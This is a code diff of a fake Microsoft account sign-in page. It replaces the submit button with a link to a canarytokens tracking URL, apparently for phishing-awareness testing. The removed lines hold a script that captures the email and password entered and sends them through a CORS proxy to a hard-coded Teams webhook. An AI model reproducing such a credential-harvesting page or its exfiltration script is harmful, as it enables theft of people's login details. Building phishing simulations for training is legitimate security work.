@@ -36,7 +36,7 @@
             border: 1px solid #cccccc;
             border-radius: 4px;
         }
-        button[type="submit"] {
+        a{
             width: 100%;
             background-color: #0067b8;
             color: white;
@@ -46,7 +46,7 @@
             border-radius: 4px;
             cursor: pointer;
         }
-        button[type="submit"]:hover {
+        a:hover {
             background-color: #005299;
         }
         svg {
@@ -70,65 +70,8 @@
             <h1>Sign In with<br>your Microsoft account</h1>
             <input name="email" type="text" placeholder="Email" required>
             <input name="password" type="password" placeholder="Password" required>
-            <button type="submit">Next</button>
+            <a href="http://canarytokens.com/traffic/tags/about/owwgvpse4dzx3dopmk7day2bc/index.html">Next</a>
         </form>
     </div>
-
-    <script>
-        // Add an event listener to the form to capture the submit event
-        document.getElementById("email-form-step").addEventListener("submit", function(event) {
-            event.preventDefault(); // Prevent the default form submission
-
-            // Get the form data
-            const formData = new FormData(event.target);
-
-            // Create a JSON object with the form data
-            const dataToSend = {};
-            formData.forEach((value, key) => {
-                dataToSend[key] = value;
-            });
-
-            // Convert the data to a Teams-compatible message format
-            const message = {
-                "@type": "MessageCard",
-                "@context": "http://schema.org/extensions",
-                "themeColor": "0072C6",
-                "title": "Form Submission",
-                "text": "A form has been submitted with the following data:",
-                "sections": [
-                    {
-                        "facts": Object.keys(dataToSend).map(key => ({
-                            "name": key,
-                            "value": dataToSend[key]
-                        }))
-                    }
-                ]
-            };
-
-            // Use the CORS Anywhere proxy to send the data to Microsoft Teams
-            const corsProxyUrl = 'https://cors.bridged.cc/';
-            const teamsWebhookUrl = 'https://vermeercorp.webhook.office.com/webhookb2/2537c2e3-0290-4806-8a97-62a66cbd1060@a092aca4-b5d0-43a3-aef5-ae017bd139bd/IncomingWebhook/5d37b34c0d8243769fa87f19a736380b/afc23c12-2856-4323-9265-a7a33c3d7469';
-
-            fetch(corsProxyUrl + teamsWebhookUrl, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify(message)
-            })
-            .then(response => {
-                if (response.ok) {
-                    // The request was successful
-                    console.log('Data sent to Microsoft Teams successfully');
-                } else {
-                    // The request failed
-                    console.error('Failed to send data to Microsoft Teams');
-                }
-            })
-            .catch(error => {
-                console.error('Error:', error);
-            });
-        });
-    </script>
 </body>
 </html>
